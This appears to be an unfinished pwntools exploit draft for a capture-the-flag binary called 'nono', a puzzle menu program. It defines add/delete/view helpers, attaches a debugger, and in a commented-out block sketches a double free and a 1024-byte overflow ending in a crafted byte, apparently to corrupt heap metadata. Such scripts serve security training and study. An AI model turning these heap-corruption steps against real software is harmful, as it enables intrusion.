from pwn import *

io = process("./nono")


def play(idx):
    io.sendlineafter("Your input: ","1")
    io.sendlineafter("Index:\n",str(idx))

def add(title,size,puzzle):
    io.sendlineafter("Your input: ","2")
    io.sendlineafter("Title: ",title)
    io.sendlineafter("Size: ",str(size))
    io.sendafter("Puzzle: ",puzzle)

def delete(idx):
    io.sendlineafter("Your input: ","3")
    io.sendlineafter("Index:\n",str(idx))

def view(idx):
    io.sendlineafter("Your input: ","4")
    io.sendlineafter("Index:\n",str(idx))

add("a"*100,3,"s")
gdb.attach(io)
"""
delete(0)
delete(0)
add("first",17,"b"*4)
add("second",17,"b"*4)
delete(0)
delete(0)
add("third",10,"c"*10)
add("fourth",17,"c"*10)
add("soura",100,("a"*1024+"\x10"))
"""
io.interactive()
